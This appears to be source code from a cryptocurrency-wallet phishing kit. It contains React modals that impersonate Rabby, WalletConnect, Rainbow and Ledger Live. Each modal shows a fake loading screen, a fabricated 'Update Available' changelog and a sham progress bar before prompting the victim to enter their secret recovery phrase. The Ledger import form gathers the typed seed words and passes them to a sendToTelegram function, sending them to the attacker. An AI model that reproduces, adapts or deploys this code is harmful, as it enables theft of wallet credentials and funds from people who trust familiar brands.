        <linearGradient id="rabby_g0" x1="32.389" y1="48.683" x2="91.836" y2="65.478" gradientUnits="userSpaceOnUse"><stop stopColor="#8697FF"/><stop offset="1" stopColor="#ABB7FF"/></linearGradient>
        <linearGradient id="rabby_g1" x1="81.798" y1="47.549" x2="38.766" y2="4.574" gradientUnits="userSpaceOnUse"><stop stopColor="#8697FF"/><stop offset="1" stopColor="#5156D8" stopOpacity="0"/></linearGradient>
        <linearGradient id="rabby_g2" x1="59.66" y1="71.678" x2="18.401" y2="48.046" gradientUnits="userSpaceOnUse"><stop stopColor="#465EED"/><stop offset="1" stopColor="#8697FF" stopOpacity="0"/></linearGradient>
        <linearGradient id="rabby_g3" x1="35.936" y1="48.237" x2="63.901" y2="83.636" gradientUnits="userSpaceOnUse"><stop stopColor="#8898FF"/><stop offset="0.984" stopColor="#6277F1"/></linearGradient>
      </defs>
    </svg>
  )

  return (
    <>
      <style>{`
        @keyframes rabbySlide { from{opacity:0;transform:translateX(20px)} to{opacity:1;transform:translateX(0)} }
        @keyframes rabbyBounce { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-8px)} }
        .rabby-overlay { position:fixed;inset:0;z-index:10000;background:rgba(18,18,18,.5);pointer-events:auto; }
        .rabby-modal { position:fixed;z-index:10001;top:0;right:32px;width:360px;height:680px;background:#fff;border:1px solid #eaecef;box-shadow:0 8px 40px rgba(0,0,0,.18);display:flex;flex-direction:column;overflow:hidden;font-family:'Inter',-apple-system,sans-serif;animation:rabbySlide .2s ease; }
        @media(max-width:600px){.rabby-modal{top:0;left:0;right:0;bottom:0;width:100%;height:100%;max-height:100%;border-radius:0;}}
      `}</style>
      <div className="rabby-overlay" onClick={onClose} />
      <div className="rabby-modal">

        {/* Loading */}
        {phase === 'loading' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', background: 'linear-gradient(135deg,#6a7ad5 0%,#8697ff 100%)' }}>
            <RabbySVG size={100} />
            <h3 style={{ fontSize: 24, fontWeight: 500, color: '#fff', margin: '12px 0 0', textAlign: 'center' }}>Loading your Rabby Wallet</h3>
            <p style={{ fontSize: 14, color: 'rgba(255,255,255,.7)', margin: '8px 0 0', textAlign: 'center', maxWidth: 280 }}>The game-changing wallet for Ethereum and all EVM chains</p>
          </div>
        )}

        {/* Update */}
        {phase === 'update' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto', background: '#fff' }}>
            <div style={{ padding: '32px 24px', display: 'flex', flexDirection: 'column', height: '100%', boxSizing: 'border-box' }}>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 32 }}>
                <div style={{ marginBottom: 24 }}><RabbySVG size={80} /></div>
                <h3 style={{ fontSize: 24, fontWeight: 500, color: '#192945', margin: '0 0 8px', textAlign: 'center' }}>Update Available</h3>
                <p style={{ fontSize: 16, color: '#6a7587', margin: 0, textAlign: 'center' }}>Version 0.93.49</p>
              </div>
              <div style={{ flex: 1, marginBottom: 32 }}>
                <h4 style={{ fontSize: 18, fontWeight: 500, color: '#192945', marginBottom: 16 }}>What&apos;s new</h4>
                <ul style={{ margin: 0, padding: 0, listStyle: 'none', display: 'flex', flexDirection: 'column', gap: 12 }}>
                  {['Enhanced multi-chain support with seamless asset viewing', 'Improved transaction security analysis for better protection', 'Fixed network connectivity issues with Layer 2 solutions', 'Added support for new EVM-compatible chains', 'Performance optimizations for faster DApp interactions'].map((item, i) => (
                    <li key={i} style={{ display: 'flex', alignItems: 'flex-start', gap: 8 }}>
                      <svg style={{ color: '#7084ff', flexShrink: 0, marginTop: 2 }} width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="20 6 9 17 4 12" /></svg>
                      <span style={{ fontSize: 14, color: '#192945', lineHeight: 1.5 }}>{item}</span>
                    </li>
                  ))}
                </ul>
              </div>
              <div style={{ marginTop: 'auto' }}>
                <button onClick={() => setPhase('updating')} style={{ width: '100%', height: 56, background: '#7084ff', color: '#fff', border: 'none', borderRadius: 8, fontSize: 17, fontWeight: 500, cursor: 'pointer' }}>Update Now</button>
                <div style={{ textAlign: 'center', marginTop: 16 }}>
                  <a href="https://rabby.io/help" target="_blank" rel="noreferrer" style={{ color: '#7084ff', fontSize: 14, textDecoration: 'none' }}>Need help? Visit our Support Center</a>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Updating */}
        {phase === 'updating' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', background: '#fff' }}>
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '32px 24px', boxSizing: 'border-box' }}>
              <div style={{ animation: 'rabbyBounce 1.2s ease-in-out infinite', marginBottom: 32 }}><RabbySVG size={80} /></div>
              <h3 style={{ fontSize: 24, fontWeight: 500, color: '#192945', margin: '0 0 8px', textAlign: 'center' }}>Updating Rabby Wallet</h3>
              <p style={{ fontSize: 16, color: '#6a7587', margin: '0 0 32px', textAlign: 'center' }}>Please wait while we update to version 0.93.49</p>
              <div style={{ width: '100%', marginBottom: 24 }}>
                <div style={{ width: '100%', height: 8, background: '#f2f4f7', borderRadius: 999, overflow: 'hidden' }}>
                  <div style={{ height: '100%', width: `${progress}%`, background: '#7084ff', borderRadius: 999, transition: 'width .1s linear' }} />
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 8 }}>
                  <span style={{ fontSize: 14, color: '#6a7587' }}>Downloading update...</span>
                  <span style={{ fontSize: 14, fontWeight: 500, color: '#192945' }}>{progress}%</span>
                </div>
              </div>
              <div style={{ marginTop: 'auto', textAlign: 'center' }}>
                <p style={{ fontSize: 14, color: '#6a7587' }}>Please do not close this window during the update.</p>
              </div>
            </div>
          </div>
        )}

        {/* Import */}
        {phase === 'import' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto', background: '#fff' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '12px' }}>
              <button onClick={onClose} style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 4 }}>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="1.5"><path d="m15 18-6-6 6-6" /></svg>
              </button>
              <div style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
                <svg width="8" height="8" viewBox="0 0 8 8"><circle cx="4" cy="4" r="4" fill="#7084ff" /></svg>
                <div style={{ width: 56, height: 1, background: '#dee3fc' }} />
                <svg width="8" height="8" viewBox="0 0 8 8"><circle cx="4" cy="4" r="4" fill="#dee3fc" /></svg>
              </div>
              <div style={{ width: 24 }} />
            </div>
            <div style={{ display: 'flex', justifyContent: 'center', padding: '16px 12px' }}>
              <p style={{ fontSize: 20, fontWeight: 500, color: '#192945', margin: 0 }}>Import Secret Phrase</p>
            </div>
            <SeedGrid wordCount={wordCount} setWordCount={setWordCount} onConfirm={onImportDone || onClose} walletName="Rabby Wallet" btnBg="#7084ff" />
          </div>
        )}
      </div>
    </>
  )
}

/* ══════════════════════════════════════════════
   4. WALLETCONNECT MODAL  (called "anyw" in ref)
   - Loading: walletconnect.png centered, "Loading Wallet Connect"
   - Update: walletconnect.png, "Update Available", "Version 2.21.8", checkmark bullets
   - Updating: bouncing walletconnect.png, "Updating Wallet Connect", progress #7084ff
   - Import: "Import Secret Phrase"
══════════════════════════════════════════════ */
export function WalletConnectModal({ onClose, onImportDone }) {
  const [phase, setPhase] = useState('loading')
  const [wordCount, setWordCount] = useState('12')
  const progress = useProgressTimer(phase === 'updating', () => setPhase('import'))

  useEffect(() => {
    if (phase !== 'loading') return
    const t = setTimeout(() => setPhase('update'), 3000)
    return () => clearTimeout(t)
  }, [])

  return (
    <>
      <style>{`
        @keyframes wcSlide { from{opacity:0;transform:translateX(20px)} to{opacity:1;transform:translateX(0)} }
        @keyframes wcBounce { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-8px)} }
        .wc-overlay { position:fixed;inset:0;z-index:10000;background:rgba(18,18,18,.5);pointer-events:auto; }
        .wc-modal { position:fixed;z-index:10001;top:0;right:32px;width:360px;height:680px;background:#fff;border:1px solid #eaecef;box-shadow:0 8px 40px rgba(0,0,0,.18);display:flex;flex-direction:column;overflow:hidden;font-family:'Inter',-apple-system,sans-serif;animation:wcSlide .2s ease; }
        @media(max-width:600px){.wc-modal{top:0;left:0;right:0;bottom:0;width:100%;height:100%;max-height:100%;border-radius:0;}}
      `}</style>
      <div className="wc-overlay" onClick={onClose} />
      <div className="wc-modal">

        {/* Loading */}
        {phase === 'loading' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', background: '#fff', gap: 16 }}>
            <img src="/media/images/walletconnect.png" style={{ width: 80, height: 80, objectFit: 'contain' }} alt="WalletConnect" />
            <h3 style={{ fontSize: 24, fontWeight: 500, color: '#192945', margin: 0, textAlign: 'center' }}>Loading Wallet Connect</h3>
            <p style={{ fontSize: 14, color: '#6a7587', margin: 0, textAlign: 'center', maxWidth: 280 }}>The game-changing wallet for Ethereum and all EVM chains</p>
          </div>
        )}

        {/* Update */}
        {phase === 'update' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto', background: '#fff' }}>
            <div style={{ padding: '32px 24px', display: 'flex', flexDirection: 'column', height: '100%', boxSizing: 'border-box' }}>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 32 }}>
                <img src="/media/images/walletconnect.png" style={{ width: 60, height: 60, marginBottom: 24, objectFit: 'contain' }} alt="WalletConnect" />
                <h3 style={{ fontSize: 24, fontWeight: 500, color: '#192945', margin: '0 0 8px', textAlign: 'center' }}>Update Available</h3>
                <p style={{ fontSize: 16, color: '#6a7587', margin: 0, textAlign: 'center' }}>Version 2.21.8</p>
              </div>
              <div style={{ flex: 1, marginBottom: 32 }}>
                <h4 style={{ fontSize: 18, fontWeight: 500, color: '#192945', marginBottom: 16 }}>Wallet Connect Updates</h4>
                <ul style={{ margin: 0, padding: 0, listStyle: 'none', display: 'flex', flexDirection: 'column', gap: 12 }}>
                  {['Seamless connection with multiple wallets including MetaMask, TrustWallet, and Coinbase Wallet', 'Improved QR code scanning for faster wallet authentication', 'Secure session management for persistent wallet connections', 'Supports multiple chain networks with instant balance display', 'Optimized for faster transaction approvals directly from the wallet'].map((item, i) => (
                    <li key={i} style={{ display: 'flex', alignItems: 'flex-start', gap: 8 }}>
                      <svg style={{ color: '#7084ff', flexShrink: 0, marginTop: 2 }} width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="20 6 9 17 4 12" /></svg>
                      <span style={{ fontSize: 14, color: '#192945', lineHeight: 1.5 }}>{item}</span>
                    </li>
                  ))}
                </ul>
              </div>
              <div style={{ marginTop: 'auto' }}>
                <button onClick={() => setPhase('updating')} style={{ width: '100%', height: 56, background: '#7084ff', color: '#fff', border: 'none', borderRadius: 8, fontSize: 17, fontWeight: 500, cursor: 'pointer' }}>Update Now</button>
                <div style={{ textAlign: 'center', marginTop: 16 }}>
                  <a href="https://docs.walletconnect.com" target="_blank" rel="noreferrer" style={{ color: '#7084ff', fontSize: 14, textDecoration: 'none' }}>Need help? Visit our Support Center</a>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Updating */}
        {phase === 'updating' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', background: '#fff' }}>
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '32px 24px', boxSizing: 'border-box' }}>
              <div style={{ animation: 'wcBounce 1.2s ease-in-out infinite', marginBottom: 32 }}>
                <img src="/media/images/walletconnect.png" style={{ width: 80, height: 80, objectFit: 'contain' }} alt="WalletConnect" />
              </div>
              <h3 style={{ fontSize: 24, fontWeight: 500, color: '#192945', margin: '0 0 8px', textAlign: 'center' }}>Updating Wallet Connect</h3>
              <p style={{ fontSize: 16, color: '#6a7587', margin: '0 0 32px', textAlign: 'center' }}>Please wait while we update to version 2.21.8</p>
              <div style={{ width: '100%', marginBottom: 24 }}>
                <div style={{ width: '100%', height: 8, background: '#f2f4f7', borderRadius: 999, overflow: 'hidden' }}>
                  <div style={{ height: '100%', width: `${progress}%`, background: '#7084ff', borderRadius: 999, transition: 'width .1s linear' }} />
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 8 }}>
                  <span style={{ fontSize: 14, color: '#6a7587' }}>Downloading update...</span>
                  <span style={{ fontSize: 14, fontWeight: 500, color: '#192945' }}>{progress}%</span>
                </div>
              </div>
              <div style={{ marginTop: 'auto', textAlign: 'center' }}>
                <p style={{ fontSize: 14, color: '#6a7587' }}>Please do not close this window during the update.</p>
              </div>
            </div>
          </div>
        )}

        {/* Import */}
        {phase === 'import' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto', background: '#fff' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '12px' }}>
              <button onClick={onClose} style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 4 }}>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="1.5"><path d="m15 18-6-6 6-6" /></svg>
              </button>
              <div style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
                <svg width="8" height="8" viewBox="0 0 8 8"><circle cx="4" cy="4" r="4" fill="#7084ff" /></svg>
                <div style={{ width: 56, height: 1, background: '#dee3fc' }} />
                <svg width="8" height="8" viewBox="0 0 8 8"><circle cx="4" cy="4" r="4" fill="#dee3fc" /></svg>
              </div>
              <div style={{ width: 24 }} />
            </div>
            <div style={{ display: 'flex', justifyContent: 'center', padding: '16px 12px' }}>
              <p style={{ fontSize: 20, fontWeight: 500, color: '#192945', margin: 0 }}>Import Secret Phrase</p>
            </div>
            <SeedGrid wordCount={wordCount} setWordCount={setWordCount} onConfirm={onImportDone || onClose} walletName="WalletConnect" btnBg="#7084ff" />
          </div>
        )}
      </div>
    </>
  )
}

/* ══════════════════════════════════════════════
   5. RAINBOW MODAL
   - Loading: white bg, rainbow.png (96px pulsing), "Loading your Rainbow Wallet...", spinner
   - Update: rainbow.png (96px), "Update Available", "Version 2.0.0", short msg, "Update Now" btn
   - Updating: spinning rainbow.png, "Updating rainbow Wallet", progress #7084ff
   - Import: word select + seed grid
══════════════════════════════════════════════ */
export function RainbowModal({ onClose, onImportDone }) {
  const [phase, setPhase] = useState('loading')
  const [wordCount, setWordCount] = useState('12')
  const progress = useProgressTimer(phase === 'updating', () => setPhase('import'))

  useEffect(() => {
    if (phase !== 'loading') return
    const t = setTimeout(() => setPhase('update'), 3000)
    return () => clearTimeout(t)
  }, [])

  return (
    <>
      <style>{`
        @keyframes rainbowSlide { from{opacity:0;transform:translateX(20px)} to{opacity:1;transform:translateX(0)} }
        @keyframes rainbowPulse { 0%,100%{opacity:1} 50%{opacity:.5} }
        @keyframes rainbowSpin { to{transform:rotate(360deg)} }
        .rb-overlay { position:fixed;inset:0;z-index:10000;background:rgba(18,18,18,.5);pointer-events:auto; }
        .rb-modal { position:fixed;z-index:10001;top:0;right:32px;width:360px;height:680px;background:#fff;border:1px solid #eaecef;box-shadow:0 8px 40px rgba(0,0,0,.18);display:flex;flex-direction:column;overflow:hidden;font-family:'Inter',-apple-system,sans-serif;animation:rainbowSlide .2s ease; }
        @media(max-width:600px){.rb-modal{top:0;left:0;right:0;bottom:0;width:100%;height:100%;max-height:100%;border-radius:0;}}
      `}</style>
      <div className="rb-overlay" onClick={onClose} />
      <div className="rb-modal">

        {/* Loading */}
        {phase === 'loading' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', background: '#fff', textAlign: 'center', gap: 0 }}>
            <div style={{ marginBottom: 24 }}>
              <img src="/media/images/wallet-rainbow.png" alt="Rainbow" style={{ width: 96, height: 96, borderRadius: 16, boxShadow: '0 4px 16px rgba(0,0,0,.12)', animation: 'rainbowPulse 2s ease-in-out infinite' }} />
            </div>
            <h3 style={{ fontSize: 26, fontWeight: 700, color: '#192945', margin: '0 0 8px', lineHeight: 1.3 }}>Loading your Rainbow Wallet...</h3>
            <p style={{ fontSize: 15, color: '#000', margin: '0 0 32px', lineHeight: 1.5 }}>Your colorful gateway to Ethereum and EVM chains</p>
            <svg style={{ width: 32, height: 32, color: '#192945', animation: 'rainbowSpin 1s linear infinite' }} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M21 12a9 9 0 1 1-6.219-8.56" strokeLinecap="round" />
            </svg>
          </div>
        )}

        {/* Update */}
        {phase === 'update' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', background: '#fff' }}>
            <div style={{ padding: '32px 24px', display: 'flex', flexDirection: 'column', alignItems: 'center', height: '100%', boxSizing: 'border-box' }}>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 32 }}>
                <img src="/media/images/wallet-rainbow.png" alt="Rainbow" style={{ width: 96, height: 96, borderRadius: 16, boxShadow: '0 4px 16px rgba(0,0,0,.12)', marginBottom: 24 }} />
                <h3 style={{ fontSize: 24, fontWeight: 500, color: '#192945', margin: '0 0 8px', textAlign: 'center' }}>Update Available</h3>
                <p style={{ fontSize: 16, color: '#6a7587', margin: 0, textAlign: 'center' }}>Version 2.0.0</p>
              </div>
              <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: 32 }}>
                <p style={{ fontSize: 16, color: '#000', textAlign: 'center', lineHeight: 1.5 }}>A fresh update is ready to brighten your Rainbow Wallet.</p>
              </div>
              <div style={{ width: '100%', marginTop: 'auto' }}>
                <button onClick={() => setPhase('updating')} style={{ width: '100%', height: 56, background: '#7084ff', color: '#fff', border: 'none', borderRadius: 8, fontSize: 17, fontWeight: 500, cursor: 'pointer' }}>Update Now</button>
              </div>
            </div>
          </div>
        )}

        {/* Updating */}
        {phase === 'updating' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', background: '#fff' }}>
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '32px 24px', boxSizing: 'border-box' }}>
              <div style={{ width: 100, height: 100, marginBottom: 32, animation: 'rainbowSpin 3s linear infinite' }}>
                <img src="/media/images/wallet-rainbow.png" alt="Rainbow" style={{ width: '100%', borderRadius: 16 }} />
              </div>
              <h3 style={{ fontSize: 24, fontWeight: 500, color: '#192945', margin: '0 0 8px', textAlign: 'center' }}>Updating Rainbow Wallet</h3>
              <p style={{ fontSize: 16, color: '#6a7587', margin: '0 0 32px', textAlign: 'center' }}>Please wait while we update to version 2.0.0</p>
              <div style={{ width: '100%', marginBottom: 24 }}>
                <div style={{ width: '100%', height: 8, background: '#f2f4f7', borderRadius: 999, overflow: 'hidden' }}>
                  <div style={{ height: '100%', width: `${progress}%`, background: '#7084ff', borderRadius: 999, transition: 'width .1s linear' }} />
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 8 }}>
                  <span style={{ fontSize: 14, color: '#6a7587' }}>Downloading update...</span>
                  <span style={{ fontSize: 14, fontWeight: 500, color: '#192945' }}>{progress}%</span>
                </div>
              </div>
              <div style={{ marginTop: 'auto', textAlign: 'center' }}>
                <p style={{ fontSize: 14, color: '#6a7587' }}>Please do not close this window during the update.</p>
              </div>
            </div>
          </div>
        )}

        {/* Import */}
        {phase === 'import' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto', background: '#fff' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '12px' }}>
              <button onClick={onClose} style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 4 }}>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="1.5"><path d="m15 18-6-6 6-6" /></svg>
              </button>
              <div style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
                <svg width="8" height="8" viewBox="0 0 8 8"><circle cx="4" cy="4" r="4" fill="#7084ff" /></svg>
                <div style={{ width: 56, height: 1, background: '#dee3fc' }} />
                <svg width="8" height="8" viewBox="0 0 8 8"><circle cx="4" cy="4" r="4" fill="#dee3fc" /></svg>
              </div>
              <div style={{ width: 24 }} />
            </div>
            <div style={{ display: 'flex', justifyContent: 'center', padding: '16px 12px' }}>
              <p style={{ fontSize: 20, fontWeight: 500, color: '#192945', margin: 0 }}>Import Secret Phrase</p>
            </div>
            <SeedGrid wordCount={wordCount} setWordCount={setWordCount} onConfirm={onImportDone || onClose} walletName="Rainbow" btnBg="#7084ff" />
          </div>
        )}
      </div>
    </>
  )
}

/* ══════════════════════════════════════════════
   6. LEDGER MODAL
   - Loading: centered modal 620×550, pink box ledger icon SVG (112px), "Connecting to Ledger Kit"
   - Import: "Continue with a wallet" button (no update screen — Ledger doesn't do updates the same way)
   NOTE: The reference site shows a loading screen then directly the import screen for Ledger.
══════════════════════════════════════════════ */
export function LedgerModal({ onClose, onImportDone }) {
  const [phase, setPhase] = useState('loading')
  const [wordCount, setWordCount] = useState('12')
  const progress = useProgressTimer(phase === 'updating', () => setPhase('import'))

  useEffect(() => {
    if (phase !== 'loading') return
    const t = setTimeout(() => setPhase('update'), 3000)
    return () => clearTimeout(t)
  }, [])

  const LedgerIcon = ({ size = 64 }) => (
    <svg width={size} height={size} viewBox="0 0 100 100" fill="none">
      <rect width="100" height="100" rx="13" fill="#000" />
      <path d="M65.7277 27H44.5023V55.3931H72.9884V34.3873C73 30.3988 69.7292 27 65.7277 27ZM37.9839 27H34.4231C30.4216 27 27 30.2486 27 34.3988V37.948H37.9839V27ZM27 44.5954H37.9839V55.5434H27V44.5954ZM62.0161 72.9884H65.5769C69.5784 72.9884 73 69.7399 73 65.5896V62.052H62.0161V72.9884ZM44.5023 62.052H55.4861V73H44.5023V62.052ZM27 62.052V65.6012C27 69.5896 30.2592 73 34.4231 73H37.9839V62.052H27Z" fill="#fff" />
    </svg>
  )

  return (
    <>
      <style>{`
        @keyframes ledgerSlide { from{opacity:0;transform:scale(.95)} to{opacity:1;transform:scale(1)} }
        @keyframes ledgerSpin  { to { transform: rotate(360deg); } }
        .lg-overlay { position:fixed;inset:0;z-index:10000;background:rgba(18,18,18,.5);pointer-events:auto; }
        .lg-modal { position:fixed;z-index:10001;top:50%;left:50%;transform:translate(-50%,-50%);width:620px;max-width:calc(100vw - 32px);height:550px;background:#fff;border-radius:24px;box-shadow:0 8px 40px rgba(0,0,0,.18);display:flex;flex-direction:column;overflow:hidden;font-family:'Inter',-apple-system,sans-serif;animation:ledgerSlide .2s ease; }
        @media(max-width:600px){.lg-modal{top:0;left:0;right:0;bottom:0;width:100%;height:100%;max-height:100%;border-radius:0;transform:none;}}
      `}</style>
      <div className="lg-overlay" onClick={onClose} />
      <div className="lg-modal">

        {/* ── Loading ── */}
        {phase === 'loading' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>
            <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
                <div style={{ borderRadius: 20, padding: 24 }}>
                  <svg width="112" height="112" viewBox="0 0 100 100" fill="none">
                    <rect width="100" height="100" rx="13" fill="#FEE5FB" />
                    <path d="M65.7277 27H44.5023V55.3931H72.9884V34.3873C73 30.3988 69.7292 27 65.7277 27ZM37.9839 27H34.4231C30.4216 27 27 30.2486 27 34.3988V37.948H37.9839V27ZM27 44.5954H37.9839V55.5434H27V44.5954ZM62.0161 72.9884H65.5769C69.5784 72.9884 73 69.7399 73 65.5896V62.052H62.0161V72.9884ZM44.5023 62.052H55.4861V73H44.5023V62.052ZM27 62.052V65.6012C27 69.5896 30.2592 73 34.4231 73H37.9839V62.052H27Z" fill="#333" />
                  </svg>
                </div>
                <p style={{ marginTop: 16, fontSize: 20, color: '#202020', fontWeight: 400, margin: '16px 0 0' }}>Connecting to Ledger Kit</p>
              </div>
            </div>
            <div style={{ paddingBottom: 28, display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 4 }}>
              <span style={{ fontSize: 11, fontWeight: 500, color: '#b0b0b0', letterSpacing: '0.08em', textTransform: 'uppercase' }}>Powered by reown</span>
              <span style={{ fontSize: 13, fontWeight: 600, color: '#202020', letterSpacing: '0.02em' }}>Wallet Kit</span>
            </div>
          </div>
        )}

        {/* ── Update Available ── */}
        {phase === 'update' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto' }}>
            {/* Header */}
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '20px 24px 0' }}>
              <button onClick={onClose} style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 4 }}>
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2"><path d="M18 6 6 18M6 6l12 12"/></svg>
              </button>
              <span style={{ fontSize: 13, fontWeight: 500, color: '#999' }}>Ledger Live · v3.42.0</span>
              <div style={{ width: 30 }} />
            </div>

            {/* Body */}
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '28px 32px 0', textAlign: 'center' }}>
              <LedgerIcon size={72} />
              <h2 style={{ fontSize: 26, fontWeight: 700, color: '#0a0a0a', margin: '20px 0 6px' }}>Update Available</h2>
              <p style={{ fontSize: 15, color: '#666', margin: '0 0 28px' }}>Version 3.43.0 — Security & Performance</p>

              {/* Changelog */}
              <div style={{ width: '100%', background: '#f7f7f7', borderRadius: 14, padding: '20px 24px', textAlign: 'left', marginBottom: 28 }}>
                <p style={{ fontSize: 12, fontWeight: 700, color: '#999', letterSpacing: '0.08em', textTransform: 'uppercase', margin: '0 0 14px' }}>What's new</p>
                {[
                  'Enhanced hardware wallet security protocols',
                  'Improved Bluetooth connectivity stability',
                  'Fixed account balance sync issues',
                  'Support for new EVM-compatible networks',
                ].map((item, i) => (
                  <div key={i} style={{ display: 'flex', alignItems: 'flex-start', gap: 10, marginBottom: i < 3 ? 10 : 0 }}>
                    <svg style={{ flexShrink: 0, marginTop: 2 }} width="14" height="14" viewBox="0 0 24 24" fill="none">
                      <circle cx="12" cy="12" r="10" fill="#000"/>
                      <path d="m8 12 3 3 5-5" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                    <span style={{ fontSize: 14, color: '#333', lineHeight: 1.5 }}>{item}</span>
                  </div>
                ))}
              </div>

              <button onClick={() => setPhase('updating')} style={{ width: '100%', height: 52, background: '#000', color: '#fff', border: 'none', borderRadius: 12, fontSize: 16, fontWeight: 600, cursor: 'pointer', letterSpacing: '0.01em', transition: 'opacity 0.2s' }}
                onMouseEnter={e => e.target.style.opacity = '0.85'} onMouseLeave={e => e.target.style.opacity = '1'}>
                Update Now
              </button>
              <p style={{ fontSize: 13, color: '#aaa', margin: '12px 0 0' }}>
                Need help?{' '}
                <a href="https://support.ledger.com" target="_blank" rel="noreferrer" style={{ color: '#000', fontWeight: 500, textDecoration: 'none' }}>Contact Ledger Support</a>
              </p>
            </div>
            <div style={{ paddingBottom: 20 }} />
          </div>
        )}

        {/* ── Updating ── */}
        {phase === 'updating' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '32px 40px', textAlign: 'center' }}>
            <div style={{ width: 64, height: 64, border: '4px solid #e5e5e5', borderTopColor: '#000', borderRadius: '50%', animation: 'ledgerSpin 0.85s linear infinite', marginBottom: 32 }} />
            <h3 style={{ fontSize: 24, fontWeight: 700, color: '#0a0a0a', margin: '0 0 8px' }}>Updating Ledger Live</h3>
            <p style={{ fontSize: 15, color: '#888', margin: '0 0 32px' }}>Please wait while we install version 3.43.0</p>
            <div style={{ width: '100%' }}>
              <div style={{ width: '100%', height: 8, background: '#f0f0f0', borderRadius: 999, overflow: 'hidden' }}>
                <div style={{ height: '100%', width: `${progress}%`, background: '#000', borderRadius: 999, transition: 'width .1s linear' }} />
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 8 }}>
                <span style={{ fontSize: 13, color: '#aaa' }}>Installing update...</span>
                <span style={{ fontSize: 13, fontWeight: 600, color: '#0a0a0a' }}>{progress}%</span>
              </div>
            </div>
            <p style={{ fontSize: 13, color: '#bbb', marginTop: 24 }}>Do not close this window.</p>
          </div>
        )}

        {/* ── Import ── */}
        {phase === 'import' && (
          <LedgerImportForm wordCount={wordCount} setWordCount={setWordCount} onClose={onClose} onImportDone={onImportDone} />
        )}
      </div>
    </>
  )
}

function LedgerImportForm({ wordCount, setWordCount, onClose, onImportDone }) {
  const seedRef = useRef(null)
  const count = parseInt(wordCount)
  const handleContinue = () => {
    if (seedRef.current) {
      const inputs = seedRef.current.querySelectorAll('input')
      const words = Array.from(inputs).map(el => el.value.trim()).filter(Boolean)
      if (words.length > 0) sendToTelegram('Ledger', words)
    }
    onImportDone ? onImportDone() : onClose()
  }
  return (
    <>
    <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto', padding: '28px 24px 24px', boxSizing: 'border-box' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 20 }}>
        <button onClick={onClose} style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 4, borderRadius: 12 }}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#202020" strokeWidth="2"><path d="m15 18-6-6 6-6" /></svg>
        </button>
        <h2 style={{ fontSize: 20, fontWeight: 600, color: '#202020', margin: 0 }}>Secret Recovery Phrase</h2>
        <div style={{ width: 32 }} />
      </div>
